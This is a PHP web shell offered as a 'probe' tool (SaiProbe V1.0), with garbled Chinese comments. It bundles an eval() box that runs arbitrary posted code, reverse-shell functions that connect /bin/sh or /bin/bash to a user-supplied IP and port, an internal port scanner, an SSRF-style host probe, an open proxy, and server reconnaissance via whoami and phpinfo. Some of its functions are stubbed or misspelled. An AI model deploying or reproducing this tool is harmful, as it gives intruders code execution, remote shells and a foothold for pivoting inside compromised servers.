<?php
/*
	1.������������Ϣ�ռ�
	2.����ת��
	3.php����ִ��
	4.�����˿�ɨ��
	5.���������̽�⣨Ĭ��̽��80�˿ڣ����Brupsuit��
	6.�������
	7.phpinfo��Ϣ
*/
	error_reporting(0); //�������д�����Ϣ
	set_time_limit(0);
	ob_end_clean();		//�رջ�����
//===================================================�˿�ɨ����=====================================================
	class portScan{
		public $port;
		function __construct(){
			$this->port=array('20','21','22','23','69','80','81','110','139','389','443','445','873','1090','1433','1521','2000','2181','3306','3389','5632','5672','6379','7001','8000','8069','8080','8081','9200','10050','10086','11211','27017','28017','50070');
		}
		//url��ʽ������
		function urlFilter($url){
			$pattern="/^(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])(\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])){3}$/";
			$match=preg_match($pattern,$url);
			if(!$match){
				echo "<script>alert('�������ip��ַ�Ƿ�������������')</script>";
				exit("�ټ����ɡ���");
			}
			$url=str_replace("http://", "",$url);
			$url=str_replace("/", "",$url);
			return $url;
		}
		function Prepare(){
			if($_POST['end']!=""){			
				$base_url_1=self::urlFilter($_POST['start']);					
				$base_url_2=self::urlFilter($_POST['end']);
				/*$base_url_1=$_POST['start'];					
				$base_url_2=$_POST['end'];*/
				$base_url=array($base_url_1,$base_url_2);
				
				self::Scan($base_url,$this->port);
			}else{
				echo "<script>alert('�����Ǹ���ҲҪ��ġ���')</script>";
			}
		}
		function outPut(){

		}
		function Scan($base_url,$port){
			$start=explode('.',$base_url['0']);
			$end=explode('.',$base_url['1']);
			$length=$end['3']-$start['3'];
			for($i=0;$i<=$length;$i++){
				$ip=$start[0].".".$start[1].".".$start[2].".".($start[3]+$i);
				foreach ($port as $ports) {
					$ips="$ip:$ports";	
					//stream_set_blocking($ips, 0);				
					//$result=stream_socket_client($ips,$errno, $errstr,0.1,STREAM_CLIENT_CONNECT);
					$result=@fsockopen($ip,$ports,$errno,$errstr,0.1);
					if($result){
						echo $ip."---------------------".$ports."�˿ڿ���"."<br>";
						flush();
					}
				}
			}
		}
	}
//===================================���̽�⺯��==============================
	function ssrf($ip,$port=80){
		$res=fsockopen($ip,$port,$errno,$errstr,0.2);
		if($res){
			echo "�õ�ַ���ģ�����������";
		}else{
			echo "����";
		}

	}
//============================�˿�ת������=====================================
	function tansmit($sourceip,$sourceport,$targetip,$targetport){
		if(strtsr(php_uname(),'Windows')){

		}elseif (strstr(php_uname(), 'Linux')) {
			
		}else{

		}
	}
//============================Shell��������====================================
	function bounce($targetip,$targetport){
		if(substr(php_uname(), 0,1)=="W"){
			system("php -r '$sock=fsockopen($targetip,$targetport);exec('/bin/sh -i <&3 >&3 2>&3');'");
		}elseif (substr(php_uname(), 0,1)=="L") {
			echo 'linux test';
			system('mknod inittab p && telnet {$targetip} {$targetport} 0<inittab | /bin/bash 1>inittab');
		}else{
			echo "<script>alert('Can't recognize this operation system!)</script>";
		}
	}
//==============================���ߴ�����====================================
	function proxy($url){
		$output=file_get_contents($url);
		return $output;
	}
//======================================Main===================================
	$scan=new portScan();
	if(isset($_POST['submit'])){
		if($_POST['start']!=""){
			$scan->Prepare();
		}else{
			echo "<script>alert('ʲô��û����ôɨ��')</script>";
		}		
	}

	if(isset($_GET['ip'])){
		$ssrf_ip=$_GET['ip'];
		if($ssrf_ip!=0){
			ssrf($ssrf_ip);
		}
	}

	if(isset($_POST['trans'])) {
		tranmit($_POST['sourceip'],$_POST['sourceport'],$_POST['targetip'],$_POST['targetport']);
	}

	if(isset($_POST['rebound'])){
		bounce($_POST['tarip'],$_POST['tarport']);
	}
	if (isset($_GET['proxy'])) {
		$proxy_web=proxy($_GET['proxy']);
		echo "<div>".$proxy_web."</div>";
	}
?>

<!--
=================================================================================================================
======================================================�����ķָ���================================================
=================================================================================================================
-->

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>	
<title>Sai ����̽��V1.0</title>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css"></style>
</head>
<div align="center">
	<h1>SaiProbe V1.0</h1>
<hr>
	<div>
		<a href="?id=1">������Ϣ</a>|<a href="?id=2">����ת��</a>|<a href="?id=3">����ִ��</a>|<a href="?id=4">�˿�ɨ��</a>|<a href="?id=5&ip=0">���̽��</a>|<a href="?id=6">phpinfo</a>|<a href="?id=7&proxy=">�������</a>|<a href="#">���๦��</a>
	</div>
<hr>
<!-----------------------------������Ϣ-------------------------------->
</div>
<div align="center" id="normal">
	<fieldset>
		<legend>������Ϣ</legend>
	<table border="1" align="center" width="50%">
		<tr>
			<td>������IP/��ַ</td>
			<td><?php echo $_SERVER['SERVER_NAME'];?>(<?php if('/'==DIRECTORY_SEPARATOR){echo $_SERVER['SERVER_ADDR'];}else{echo @gethostbyname($_SERVER['SERVER_NAME']);} ?>)</td>
		</tr>
		<tr>
			<td>��ǰ�û�</td>
			<td><?php echo `whoami`?></td>
		</tr>
		<tr>
			<td>��վĿ¼</td>
			<td><?php echo $_SERVER['DOCUMENT_ROOT']?str_replace('\\','/',$_SERVER['DOCUMENT_ROOT']):str_replace('\\','/',dirname(__FILE__));?></td>
		</tr>
		<tr>
			<td>̽������Ŀ¼</td>
			<td><?php echo str_replace('\\','/',__FILE__)?str_replace('\\','/',__FILE__):$_SERVER['SCRIPT_FILENAME'];?></td>
		</tr>
		<tr>
			<td>�������˿�</td>
			<td><?php echo $_SERVER['SERVER_PORT'];?></td>
		</tr>
		<tr>
			<td>��������ʶ</td>
			<td><?php if($sysInfo['win_n'] != ''){echo $sysInfo['win_n'];}else{echo @php_uname();};?></td>
		</tr>
		<tr>
			<td>PHP�汾</td>
			<td><?php echo PHP_VERSION;?></td>
		</tr>
		<tr>
			<td>PHP��װ·��</td>
			<td><?php echo $_SERVER["PHPRC"];?></td>
		</tr>
	</table>	
	</fieldset>
</div>


<!-----------------------------����ִ��-------------------------------->
<div align="center" style="display:none" id="command">
	<fieldset>
		<legend>ִ�к���</legend>
			<form method="post" action="#">
				<div>
					���<input type="text" placeholder="system(��whoami��)" name="order"/>
					<input type="submit" value="ִ��">
				</div>
			</form>
			<div>
					<textarea cols="150" rows="30" style="resize:none">
						<?php  $order=$_POST['order'];echo eval($order.";");?>
					</textarea>
			</div>
	</fieldset>	
</div>

<!-----------------------------����ת��-------------------------------->
<div align="center" style="display:none" id="inner">
	<fieldset>
		<legend>����ת��</legend>
			<div>
				<form method="post" action="#">
				Bash������<input type="text" name="tarip" placeholder="Ŀ��IP">
					<input type="text" name="tarport" placeholder="Ŀ��˿�"> 
					<input type="submit" name="rebound" value="ִ��">
				</form>
				<form method="post" action="">
				�˿�ת����<input type="text" name="sourceip" placeholder="����IP"><input type="text" name="sourceport" placeholder="���ض˿�">
						<input type="text" name="targetip" placeholder="Ŀ��IP"><input type="text" name="targetport" placeholder="Ŀ��˿�">
						<input type="submit" name="trans" value="ִ��">
				<form>
			</div>
	</fieldset>
</div>

<!-----------------------------�����˿�ɨ��-------------------------------->
<div align="center" id="portscan" style="display:none">
	<fieldset>
		<legend>�����˿�ɨ��</legend>
		<form action="#" method="post">
			<input type="text" name="start"> -
			<input type="text" name="end">
			<input type="submit" name="submit" value="��ʼɨ��">
		</form>
	</fieldset>
</div>

<!-----------------------------���̽��-------------------------------->
<div align="center" id="ssrf" style="display:none">
	<fieldset>
		<legend>���̽��</legend>
			<b>����url��IP���������ip��ַ,���Brupsuit���ƹ��ܽ��д��̽��,Ĭ��Ϊ80�˿�</b>
	</fieldset>
</div>

<!-----------------------------phpinfo-------------------------------->
<div align="center" id="phpinfo" style="display:none">
	<fieldset>
		<legend>phpinfo</legend>
		<?php phpinfo()?>
	</fieldset>
</div>

<!-----------------------------�������-------------------------------->
<div align="center" id="proxy" style="display:none">
	<fieldset>
		<legend>�������</legend>
			<b>����url��proxy��������������ַ</b>
	</fieldset>
</div>

<!-----------------------------���๦��-------------------------------->
<div align="center" id="phpinfo" style="display:none">
	<fieldset>
	</fieldset>
</div>

<div align="center"><a href="http://www.heysec.org">Code by Sai</a></div>




<script type="text/javascript">
		var id=<?php echo $_GET['id'];?>;
		var x;
		switch (id){
			case 1:
			break;
			case 2:
				document.getElementById("inner").style.display='';
			break;
			case 3:
				document.getElementById("command").style.display='';
			break;
			case 4:
				document.getElementById("portscan").style.display='';
			break;
			case 5:
				document.getElementById("ssrf").style.display='';
			break;			
			case 6:
				document.getElementById("phpinfo").style.display='';
			break;
			case 7:
				document.getElementById("proxy").style.display='';
			break;
		}
	</script>
